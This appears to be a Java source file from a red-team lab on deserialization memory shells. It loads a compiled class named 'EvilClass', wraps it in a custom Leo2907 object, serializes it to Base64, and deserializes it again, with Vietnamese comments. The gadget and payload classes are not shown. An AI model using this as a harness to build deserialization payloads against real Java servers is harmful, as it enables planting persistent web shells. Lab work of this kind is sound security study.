package vnpay.example;

import java.io.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

public class Main {
    public static void main(String[] args) throws IOException {
        byte[] classBytes = Files.readAllBytes(Paths.get("C:\\Users\\trinh\\Desktop\\Red Team\\MemShell_Deser\\SimpleDeserialize\\EvilClass.class"));
        Leo2907 leo = new Leo2907(classBytes, "EvilClass");
//
        try {
            ByteArrayOutputStream byteOut = new ByteArrayOutputStream();
            ObjectOutputStream out = new ObjectOutputStream(byteOut);
            out.writeObject(leo);
            out.close();

            byte[] serializedData = byteOut.toByteArray();

            // In ra dạng Base64 cho dễ nhìn
            String base64 = Base64.getEncoder().encodeToString(serializedData);
            System.out.println("Serialized Person (Base64):");
            System.out.println(base64);

            // Giải mã base64 thành mảng byte
            byte[] data = Base64.getDecoder().decode(base64);

            // Đọc object từ mảng byte
            ByteArrayInputStream byteIn = new ByteArrayInputStream(data);
            ObjectInputStream in = new ObjectInputStream(byteIn);
            Leo2907 leo2 = (Leo2907) in.readObject();
            in.close();

            System.out.println("Deserialized Person:");
            System.out.println("Name: " + leo2.getName());



        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}